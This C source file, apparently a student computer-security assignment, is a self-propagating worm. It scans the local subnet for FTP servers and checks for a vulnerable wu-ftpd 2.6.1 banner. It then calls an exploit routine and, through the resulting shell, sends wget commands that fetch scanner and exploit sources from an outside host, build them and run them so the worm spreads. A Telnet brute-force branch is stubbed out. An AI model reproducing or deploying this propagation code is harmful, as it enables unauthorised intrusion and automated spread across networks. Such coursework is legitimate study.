#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <sys/types.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <time.h>
#include <ifaddrs.h>

#define IP_LENGTH 15
#define BUFFER_SIZE 256

void cshell (int sock);
int exploiter(int argc, char *argv[]);
char *showips();

int main(int argc, char *argv[]) {
 
    int meuSocket;
    int ret; 
    int conexao; 
    char buf[200]; 
    int fd;
    struct sockaddr_in vitima;
    meuSocket = socket(AF_INET, SOCK_STREAM, 0);
 
    if(meuSocket == -1) {
        printf("Ocorreu um erro no socket!\n");
        exit(1);    
    }

    char *ip = malloc(IP_LENGTH*sizeof(char));

    ip = showips();

    // Isolate subnet from IP
    int i = 0;
    char *subnet = malloc(IP_LENGTH*sizeof(char));
    char *token;
    subnet[0] = '\0';
    while (((token = strsep(&ip, ".")) != NULL) && i<3 ) {        
        strcat(subnet, token);
        strcat(subnet, ".");
        i++;
    }

    ip = malloc(IP_LENGTH*sizeof(char));
    char *ips = malloc(3*sizeof(char));
    for (int ipaddr=203; ipaddr<=254; ipaddr++) {

        strcpy(ip, subnet);
        sprintf(ips, "%d", ipaddr);
        strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);

        // printf("ip: %s\n", ip);

        vitima.sin_family = AF_INET;
        vitima.sin_port = htons(21);
        vitima.sin_addr.s_addr = inet_addr(ip);
        // conexao = connect(meuSocket, (struct sockaddr * )&vitima, sizeof(vitima));

        printf("trying IP: %s\n", ip);
        if (connect(meuSocket,(struct sockaddr *)&vitima,sizeof(vitima)) < 0) {
            close(meuSocket);

            if (errno == 51) { 
                // Error 51 means network unreachable, IP inactive
                // port = port_max;
                printf("IP unreachable\n");
            } // Other errors can be port inactive or operation timeout
            printf("FTP printfort unreachable\n");
            continue; 
        }
        

        memset(buf, '\0', 200);
        ret = recv(meuSocket, buf, 199, 0);
        printf("O banner é: %s\n", buf);
        if (strstr(buf,"220 redhat1 FTP server (Version wu-2.6.1-18) ready.") != NULL) {
            int argc = 4;
            char *argv[4] = {
                "exploiter",
                "-d",
                ip,
                "-a"
            };

            fd = exploiter(argc, argv);
            cshell(fd);
            exit(1);
        } else {
            // força bruta???
            vitima.sin_port = htons(23);
            printf("trying IP: %s\n", ip);

            if (connect(meuSocket,(struct sockaddr *)&vitima,sizeof(vitima)) < 0) {
                close(meuSocket);

                if (errno == 51) { 
                    // Error 51 means network unreachable, IP inactive
                    // port = port_max;
                    printf("IP unreachable\n");
                } // Other errors can be port inactive or operation timeout
                printf("Telnet port unreachable\n");
                continue; 
            }
        }
        

    }

    exit(0);
    
     
    if(ret == -1) {
        printf("Nao recebeu nada!\n\n"); 
    }
     
    printf("O banner é: %s\n", buf);

    printf("Colocar aqui um if\n");
 
    close(meuSocket);
    return(0); 
}

void cshell (int sock) {
        int     l;
        char    buf[512];
        char    buf2[2];
        fd_set  rfds;

        char *commands[5] = {   
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
                                "make\n",
                                "./portscan\n"
        }; //, "gcc portscan.c -o portscan", "./portscan"};
        // int buffsize[7] = {3, 4, 5, 3, 8};

        int i;
        for(i=0; i<5; i++) {
            write (sock, commands[i], strlen(commands[i]));
        }
        

        // int i = 0;
        // while (1) {
        //     // printf("%s\n", commands[i]);

        //     FD_SET (0, &rfds);
        //     FD_SET (sock, &rfds);

        //     select (sock + 1, &rfds, NULL, NULL, NULL);

        //     // This here is user input
        //     if (FD_ISSET (0, &rfds)) {
        //         // l = read (0, buf2, sizeof (buf2));
        //         sprintf(buf, "%s",commands[i]);
        //         l = strlen(buf);
        //         // buf[l] = '\0';
        //         printf("-- %d %s --\n", l, buf);
        //         if (l <= 0) {
        //             perror ("read user");
        //             exit (EXIT_FAILURE);
        //         }
        //         write (sock, buf, l);

        //         i+=1;
        //     }

        //     // This is the terminal output
        //     if (FD_ISSET (sock, &rfds)) {
        //         l = read (sock, buf, sizeof (buf));
        //         //printf("-- %d %s --\n", l, buf);
        //         if (l == 0) {
        //             printf ("connection closed by foreign host.\n");
        //             exit (EXIT_FAILURE);
        //         } else if (l < 0) {
        //             perror ("read remote");
        //             exit (EXIT_FAILURE);
        //         }
        //         write (1, buf, l);
        //     }
        // }
}

char *showips() {
    struct ifaddrs *addrs;

    getifaddrs(&addrs);
    struct ifaddrs *tmp = addrs;

    while (tmp) 
    {
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET)
        {
            struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
            if (strcmp("lo0", tmp->ifa_name)) {
                printf("%s: %s\n", tmp->ifa_name, inet_ntoa(pAddr->sin_addr));
                return inet_ntoa(pAddr->sin_addr);
            }
        }

        tmp = tmp->ifa_next;
    }

    freeifaddrs(addrs);

    return NULL;
}

// http://www.inf.ufpr.br/rdmgreca/sistdist/project1/relatorio/diag.c.txt